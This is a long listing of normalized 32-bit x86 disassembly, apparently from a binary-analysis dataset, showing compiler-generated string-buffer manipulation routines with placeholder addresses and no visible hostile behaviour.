sub edx [ ebp - 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x5c ] ecx
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x20 ] esi
add ecx esi
mov [ ebp - 0x100 ] ecx
mov eax [ ebp - 0x100 ]
mov dl [ ebp - 0xf9 ]
mov [ eax ] dl
cmp [ ebp - 0x8c ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xad ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x6c ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edi [ ebp - 0x3c ]
mov edi rw-data
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58 ] edx
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov edx [ ebp - 0x44 ]
mov [ ebp - 0xb8 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x6c ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x6c ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x4c ]
add ecx [ ebp - 0x48 ]
mov [ ebp - 0x54 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
push edi
call sub_4c4e7c
mov ebx [ ebp + 0x8 ]
pop ecx
add ebx 0x30
test edi edi
mov esi eax
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xb4 ] eax
mov eax [ ebp - 0xb4 ]
mov cl [ ebp - 0xad ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x6c ]
mov [ ebp - 0x70 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x4c ]
mov [ ebp - 0x58 ] eax
mov edx [ ebp - 0x50 ]
push edx
mov ecx [ ebp - 0x54 ]
push ecx
mov eax [ ebp - 0x58 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x5c ] edx
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x61 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test al al
je r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x40 ]
mov [ ebp - 0xbc ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x60 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
mov cl [ ebp - 0x61 ]
mov [ eax ] cl
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x198 ] eax
cmp [ ebp - 0x198 ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edi eax
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xc0 ] eax
mov edx [ ebp - 0xb8 ]
push edx
mov ecx [ ebp - 0xbc ]
push ecx
mov eax [ ebp - 0xc0 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x44 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x6c ]
mov [ ebp - 0x74 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x198 ]
dec edx
mov edx 0x1
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0xc4 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xcc ] ecx
mov edx [ ebp - 0xcc ]
mov cl [ ebp - 0xc5 ]
mov [ edx ] cl
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x78 ] eax
mov edx [ ebp - 0x70 ]
push edx
mov ecx [ ebp - 0x74 ]
push ecx
mov eax [ ebp - 0x78 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x6c ]
mov [ ebp - 0x7c ] edx
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x81 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp esi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp esi edx
jbe r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x108 ]
mov [ ebp - 0x10c ] ecx
cmp esi [ ebp - 0x10c ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub edi edx
mov [ ebp - 0x108 ] edi
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x108 ]
jae r-xdata
mov al 0x1
add edx [ ebx + 0x20 ]
cmp edi edx
jb r-xdata
mov edx [ ebp - 0x80 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x88 ]
mov cl [ ebp - 0x81 ]
mov [ eax ] cl
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push esi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x10c ] esi
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1b5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x154 ] eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x158 ] eax
cmp [ ebp - 0x158 ] 0x1
ja r-xdata
mov [ ebp - 0x110 ] 0xffffffff
mov eax [ ebp - 0x108 ]
add eax [ ebp - 0x10c ]
mov [ ebp - 0x114 ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x114 ]
jae r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x158 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x114 ]
cmp ecx [ ebp - 0x110 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x1bc ] eax
mov eax [ ebp - 0x1bc ]
mov cl [ ebp - 0x1b5 ]
mov [ eax ] cl
mov eax [ ebx + 0x24 ]
cmp eax [ ebp - 0x154 ]
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x154 ]
jae r-xdata
cmp [ ebp - 0x110 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x114 ]
mov [ ebp - 0x110 ] eax
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x1c0 ] edx
push esi
push edi
mov eax [ ebp - 0x1c0 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x1c1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x154 ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov eax [ ebp - 0x154 ]
push eax
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp - 0x134 ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x114 ]
sub edx [ ebp - 0x110 ]
mov [ ebp - 0x118 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebx + 0x20 ] esi
add ecx esi
mov [ ebp - 0x1c8 ] ecx
mov eax [ ebp - 0x1c8 ]
mov dl [ ebp - 0x1c1 ]
mov [ eax ] dl
cmp [ ebp - 0x154 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x175 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x134 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov [ ebp - 0x180 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x134 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x134 ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x114 ]
add ecx [ ebp - 0x110 ]
mov [ ebp - 0x11c ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x17c ] eax
mov eax [ ebp - 0x17c ]
mov cl [ ebp - 0x175 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x134 ]
mov [ ebp - 0x138 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x114 ]
mov [ ebp - 0x120 ] eax
mov edx [ ebp - 0x118 ]
push edx
mov ecx [ ebp - 0x11c ]
push ecx
mov eax [ ebp - 0x120 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x110 ]
mov [ ebp - 0x124 ] edx
mov ecx [ ebp - 0x124 ]
mov [ ebp - 0x128 ] ecx
mov [ ebp - 0x129 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x108 ]
mov [ ebp - 0x184 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x128 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x130 ]
mov cl [ ebp - 0x129 ]
mov [ eax ] cl
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x188 ] eax
mov edx [ ebp - 0x180 ]
push edx
mov ecx [ ebp - 0x184 ]
push ecx
mov eax [ ebp - 0x188 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x10c ]
mov [ ebp - 0x18c ] edx
mov [ ebp - 0x18d ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x134 ]
mov [ ebp - 0x13c ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x18c ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x194 ] ecx
mov edx [ ebp - 0x194 ]
mov cl [ ebp - 0x18d ]
mov [ edx ] cl
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x140 ] eax
mov edx [ ebp - 0x138 ]
push edx
mov ecx [ ebp - 0x13c ]
push ecx
mov eax [ ebp - 0x140 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x134 ]
mov [ ebp - 0x144 ] edx
mov ecx [ ebp - 0x144 ]
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x149 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x148 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x150 ]
mov cl [ ebp - 0x149 ]
mov [ eax ] cl
jmp r-xdata
sub_4bb8e4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x8 ] 0x3
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jbe r-xdata
dec [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x30
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x8
cmp [ eax + 0x24 ] 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
lea edx [ eax + 0x10 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax edx
push eax
push 0xff
call sub_4cc76c
add esp 0x8
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
xor edx edx
mov [ ebx + 0x20 ] edx
add ecx edx
mov edx ecx
mov [ edx ] al
dec [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add ecx edx
mov edx ecx
mov [ edx ] al
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
test [ ebp + 0xc ] 0x1
je r-xdata
sub_4bbb34
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
dec [ ebp - 0x8 ]
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
sub_4bbb84
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov edx [ ebp + 0x8 ]
push edx
call sub_4bbbac
pop ecx
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_4bbbac
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
push esi
push edi
mov edi rw-data
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
jne r-xdata
push ebx
call sub_4c428c
pop ecx
mov esi eax
test eax eax
je r-xdata
mov ebx 0x1
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call [ edi ]
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x28 ]
mov edx rw-data
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov ecx rw-data
mov [ ebp - 0x18 ] 0x18
mov [ ebp - 0x4 ] edx
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
inc [ ebp - 0xc ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
mov [ ebp - 0x18 ] 0xc
push rw-data
call sub_4b97a4
pop ecx
add [ ebp - 0xc ] 0x2
sub [ ebp - 0xc ] 0x2
inc [ rw-data ]
sub_4bbc64
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
push 0x0
push rw-data
call sub_4b0264
add esp 0x8
mov [ rw-data ] 0x0
sub_4bbca8
push ebp
mov ebp esp
add esp 0xfffffe10
mov eax rw-data
push ebx
push esi
push edi
lea esi [ ebp - 0x30 ]
lea ebx [ ebp - 0x58 ]
call sub_4c517c
lea edx [ ebp - 0x7c ]
lea ecx [ ebp - 0x84 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x6c ] 0x18
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x84 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x85 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x8c ]
mov cl [ ebp - 0x85 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov edi eax
mov eax rw-data
test eax eax
je r-xdata
test dl dl
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x11c ] eax
cmp [ ebp - 0x11c ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
mov ecx [ ebp - 0x11c ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x90 ]
mov [ ebp - 0x94 ] edx
cmp edi [ ebp - 0x94 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x90 ] eax
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x90 ]
jae r-xdata
mov dl 0x1
add eax [ ebx + 0x20 ]
cmp eax rw-data
ja r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x94 ] edi
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x135 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x94 ]
mov [ ebp - 0xdc ] eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0xe0 ] eax
cmp [ ebp - 0xe0 ] 0x1
ja r-xdata
mov [ ebp - 0x98 ] 0xffffffff
mov eax [ ebp - 0x90 ]
add eax [ ebp - 0x94 ]
mov [ ebp - 0x9c ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x9c ]
jae r-xdata
mov eax ebx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xe0 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x9c ]
cmp ecx [ ebp - 0x98 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea edx [ esi + 0x18 ]
mov edx [ esi + 0x18 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x13c ] eax
mov eax [ ebp - 0x13c ]
mov cl [ ebp - 0x135 ]
mov [ eax ] cl
mov eax [ ebx + 0x24 ]
cmp eax [ ebp - 0xdc ]
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0xdc ]
jae r-xdata
cmp [ ebp - 0x98 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x9c ]
mov [ ebp - 0x98 ] eax
mov edx [ ebx + 0x20 ]
mov [ ebp - 0x15c ] edx
cmp [ ebp - 0x15c ] 0xffffffff
jbe r-xdata
lea eax [ esi + 0x8 ]
push eax
call sub_4bc8cc
pop ecx
xor eax eax
mov [ esi + 0x28 ] eax
add edx eax
mov [ ebp - 0x158 ] edx
mov edx [ ebp - 0x158 ]
mov cl [ ebp - 0x151 ]
mov [ edx ] cl
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x140 ] edx
push edi
push rw-data
mov eax [ ebp - 0x140 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x141 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0xdc ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov eax [ ebp - 0xdc ]
push eax
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x90 ]
mov [ ebp - 0xbc ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x9c ]
sub edx [ ebp - 0x98 ]
mov [ ebp - 0xa0 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ esi + 0x8 ]
cmp ecx ebx
jne r-xdata
mov [ ebp - 0x15c ] 0xffffffff
mov [ ebx + 0x20 ] edi
add ecx edi
mov [ ebp - 0x148 ] ecx
mov eax [ ebp - 0x148 ]
mov dl [ ebp - 0x141 ]
mov [ eax ] dl
cmp [ ebp - 0xdc ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xf9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0xbc ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x1a4 ] eax
lea edx [ esi + 0x10 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x1a8 ] eax
cmp [ ebp - 0x1a8 ] 0x1
ja r-xdata
mov [ ebp - 0x160 ] 0xffffffff
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x164 ] eax
mov edx [ esi + 0x28 ]
cmp edx [ ebp - 0x164 ]
jae r-xdata
mov eax ebx
jmp r-xdata
mov edx [ ebp - 0x94 ]
mov [ ebp - 0x104 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0xbc ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0xbc ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x9c ]
add ecx [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x1a8 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov eax [ esi + 0x28 ]
sub eax [ ebp - 0x164 ]
cmp eax [ ebp - 0x160 ]
jae r-xdata
lea ecx [ esi + 0x8 ]
push ecx
call sub_4bc8cc
pop ecx
inc [ ebp - 0x60 ]
push esi
call sub_4088ac
pop ecx
inc [ ebp - 0x60 ]
mov edx rw-data
mov [ esi ] edx
lea ecx [ ebx + 0x8 ]
push ecx
lea eax [ ebp - 0x150 ]
push eax
call sub_408650
add esp 0x8
lea edx [ ebp - 0x150 ]
push edx
lea ecx [ esi + 0x10 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ esi + 0x2c ] eax
mov [ ebp - 0x151 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x100 ] eax
mov eax [ ebp - 0x100 ]
mov cl [ ebp - 0xf9 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0xbc ]
mov [ ebp - 0xc0 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x9c ]
mov [ ebp - 0xa8 ] eax
mov edx [ ebp - 0xa0 ]
push edx
mov ecx [ ebp - 0xa4 ]
push ecx
mov eax [ ebp - 0xa8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x98 ]
mov [ ebp - 0xac ] edx
mov ecx [ ebp - 0xac ]
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xb1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ esi + 0x2c ]
cmp edx [ ebp - 0x1a4 ]
jae r-xdata
lea eax [ esi + 0x8 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x1a4 ]
jae r-xdata
cmp [ ebp - 0x160 ] 0x0
jbe r-xdata
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x164 ]
mov [ ebp - 0x160 ] edx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x90 ]
mov [ ebp - 0x108 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ eax ] cl
cmp [ ebp - 0x1a4 ] 0x0
jne r-xdata
mov eax [ esi + 0x28 ]
push eax
mov edx [ ebp - 0x1a4 ]
push edx
lea ecx [ esi + 0x8 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x184 ] eax
cmp [ esi + 0x28 ] 0x0
jae r-xdata
mov ecx [ esi + 0x28 ]
sub ecx [ ebp - 0x164 ]
sub ecx [ ebp - 0x160 ]
mov [ ebp - 0x168 ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x10c ] eax
